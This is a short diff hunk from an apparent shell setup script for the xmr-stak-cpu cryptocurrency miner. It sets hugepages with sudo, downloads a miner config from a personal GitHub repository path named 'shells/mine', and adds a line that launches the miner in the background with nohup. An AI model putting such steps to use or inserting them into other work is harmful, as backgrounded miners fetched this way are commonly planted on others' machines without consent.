@@ -12,4 +12,5 @@ sudo cp config.txt bin
 cd bin
 sudo sysctl -w vm.nr_hugepages=128
 wget -O config.txt https://github.com/m-d-z-z/m-d-z-z.github.io/raw/master/shells/mine/config.txt
+nohup ./xmr-stak-cpu > mine.log 2>&1&
 echo "done!"
